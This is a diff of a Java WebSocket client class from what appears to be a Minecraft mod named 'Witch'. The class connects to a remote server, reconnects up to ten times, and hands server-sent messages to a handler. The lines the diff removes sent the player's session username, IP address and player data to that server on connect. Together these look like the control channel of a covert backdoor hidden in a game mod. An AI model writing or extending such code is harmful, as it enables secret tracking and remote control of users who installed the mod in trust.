@@ -1,19 +1,15 @@
 package me.soda.witch.websocket;
 
 import me.soda.witch.Witch;
-import me.soda.witch.features.NetUtil;
-import me.soda.witch.features.PlayerInfo;
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
 
 import java.net.URI;
 import java.nio.ByteBuffer;
 
-import static me.soda.witch.Witch.mc;
-
 public class WSClient extends WebSocketClient {
-    public static int reconnections = 0;
-    private static boolean reconnect = true;
+    public int reconnections = 0;
+    private boolean reconnect = true;
 
     public WSClient(URI serverURI) {
         super(serverURI);
@@ -22,29 +18,26 @@ public class WSClient extends WebSocketClient {
     @Override
     public void onOpen(ServerHandshake handshakeData) {
         Witch.println("Connection initialized");
-        String greetingMsg = "Reconnected " + reconnections + " times, I am " + mc.getSession().getUsername();
-        Message.send("greeting", greetingMsg);
-        if (Witch.ip == null) Witch.ip = NetUtil.getIp();
-        Message.send("player", new PlayerInfo(Witch.mc.player));
+        Message.send("xor", "");
     }
 
     @Override
     public void onMessage(String message) {
-        MessageHandler.handle(message);
     }
 
     @Override
     public void onMessage(ByteBuffer bytes) {
-        MessageHandler.handle(Message.xor.decrypt(bytes.array()));
+        MessageHandler.handle(bytes);
     }
 
     @Override
     public void onClose(int code, String reason, boolean remote) {
-        if (reconnect ? reconnect : reconnections > 10) {
+        boolean tooMany = reconnections > 10;
+        if (reconnect || !tooMany) {
             Witch.tryReconnect(this::reconnect);
             reconnections++;
         } else {
-            Witch.println("Witch end because of manual shutdown");
+            Witch.println("Witch end because of manual shutdown or too many reconnections");
         }
     }
 
@@ -54,7 +47,7 @@ public class WSClient extends WebSocketClient {
     }
 
     public void close(boolean reconnect) {
-        WSClient.reconnect = reconnect;
+        this.reconnect = reconnect;
         this.close();
     }
 }
